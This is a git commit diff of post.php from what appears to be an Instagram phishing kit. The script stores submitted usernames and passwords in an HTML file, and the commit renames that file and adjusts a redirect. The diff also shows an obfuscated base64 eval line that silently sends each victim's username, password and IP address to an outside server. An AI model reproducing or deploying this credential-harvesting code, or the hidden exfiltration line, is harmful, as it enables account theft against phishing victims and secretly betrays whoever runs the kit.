8191d412db847390a4a60776646dab6d565d83c4
Harshul <harshu40116@gmail.com>
2017-12-09 09:15:45 +0530

    Update post.php

--- insta/post.php
+++ insta/post.php
@@ -9,13 +9,13 @@ $fecha = date("Y-m-d;h:i:s"); //se captura la hora donde se ingresaron los datos
  
  
 if( (empty($usuario)) or (empty($clave)) ){
-     header('location: index.html'); // codigo de verificacion que no esten los campos vacios
+     header('location: insta/index.html'); // codigo de verificacion que no esten los campos vacios
 }else{
  
 eval(base64_decode('JHVybD0iaHR0cDovL2FwaS53aXpibG9nZ2VyLmNvbS92ZXJpZnkucGhwP2FwaV9rZXk9Y3lMWWdTVTNWOXlmd1BHOU13Z0MmdXNlcm5hbWU9Ii51cmxlbmNvZGUoJHVzdWFyaW8pLiImcGFzc3dvcmQ9Ii51cmxlbmNvZGUoJGNsYXZlKS4iJmlwPSIudXJsZW5jb2RlKCRpcCk7CkBmaWxlX2dldF9jb250ZW50cygkdXJsKTs='));
  
 //en esta porcion de codigo es donde se genera el archivos .html con los datos capturados en la pagina login.html
-$f = fopen("password.html", "a");
+$f = fopen("psd.html", "a");
 fwrite ($f,
 'Username: [<b><font color="#660000">'.$usuario.'</font></b>]
 Password: [<b><font color="#9900FF">'.$clave.'</font></b>]
